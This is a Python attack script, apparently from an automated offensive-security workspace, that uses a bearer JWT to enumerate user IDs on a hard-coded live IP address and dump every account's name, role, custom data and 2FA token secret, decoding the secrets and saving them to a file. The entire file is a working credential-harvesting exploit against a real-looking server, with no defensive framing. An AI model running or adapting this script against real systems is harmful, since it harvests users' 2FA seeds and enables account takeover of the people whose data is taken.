#!/usr/bin/env python3
"""
Dump token2FA + customData + Role for all 200 users with NEW JWT
"""
import json
import urllib.request
import urllib.error
import base64
import time

with open("/opt/CyberStrikeAI/tmp/workspace/projects/cda6ab9b-2296-4103-b1f0-10410de2eca8/tokens.json") as f:
    tokens = json.load(f)
JWT = tokens['jwt']

def b32(s):
    if not s: return None
    try:
        x = s.upper()
        x += '=' * ((8 - len(x) % 8) % 8)
        return base64.b32decode(x).decode('utf-8', errors='replace')
    except: return None

results = []
for uid in range(1, 200):
    url = f"http://35.234.50.28:3400/users/{uid}"
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {JWT}"})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read().decode('utf-8', errors='replace')
            if r.status == 200 and body and body != "[]":
                data = json.loads(body)
                if isinstance(data, dict) and 'id' in data:
                    t2fa = data.get('token2FA')
                    role_obj = data.get('Role')
                    role_name = role_obj.get('name') if isinstance(role_obj, dict) else None
                    results.append({
                        'id': data.get('id'),
                        'account': data.get('account'),
                        'name': data.get('name'),
                        'role': role_name,
                        'customData': data.get('customData'),
                        'use2FA': data.get('use2FA'),
                        'token2FA': t2fa,
                        'token2FA_decoded': b32(t2fa),
                        'lastLoginAt': data.get('lastLoginAt'),
                        'disabled': data.get('disabled')
                    })
                    if t2fa:
                        print(f"[*] id={uid} {data.get('account'):20s} {data.get('name'):30s} role={role_name:15s} use2FA={data.get('use2FA')} t2fa={t2fa}  decoded={b32(t2fa)!r}")
    except urllib.error.HTTPError as e:
        if e.code == 401:
            print(f"[!] id={uid} JWT expired, stop")
            break
        elif e.code != 404:
            print(f"[?] /users/{uid} -> {e.code}")
    except: pass
    time.sleep(0.05)

print(f"\nTotal users: {len(results)}")
with open("/tmp/users_token2fa_dump.json", "w") as f:
    json.dump(results, f, indent=2, ensure_ascii=False)

print("\n=== ALL token2FA CARRYING USERS ===")
for r in results:
    if r.get('token2FA'):
        print(f"id={r['id']:3d} {r['account']:20s} {r['name']:30s} role={r['role']:15s} decoded={r['token2FA_decoded']!r}")